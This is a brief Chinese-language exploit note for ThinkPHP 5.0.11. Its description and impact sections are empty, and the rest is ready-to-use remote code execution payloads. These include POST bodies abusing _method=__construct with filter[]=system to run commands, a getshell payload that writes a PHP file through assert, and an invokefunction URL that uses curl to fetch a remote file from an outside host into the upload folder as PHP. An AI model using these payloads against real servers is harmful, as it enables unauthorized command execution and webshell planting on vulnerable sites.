# Thinkphp 5.0.11

> 原文：[https://www.zhihuifly.com/t/topic/3150](https://www.zhihuifly.com/t/topic/3150)

# Thinkphp 5.0.11

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

post提交

```
http://www.0-sec.org/public/index.php?s=index/index/index `s=whoami&_method=__construct&method&filter[]=system

s=whoami&_method=__construct&method=POST&filter[]=system

s=whoami&_method=__construct&method=GET&filter[]=system

_method=__construct&method=GET&filter[]=system&get[]=whoami

c=system&f=calc&_method=filter` 
```

> getshell

```
POST `s=file_put_contents(‘zerosec.php’,’<?php phpinfo();’)&_method=__construct&method=POST&filter[]=assert` 
```

> 利用远程文件写入

```
http://www.0-sec.org/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.php 
```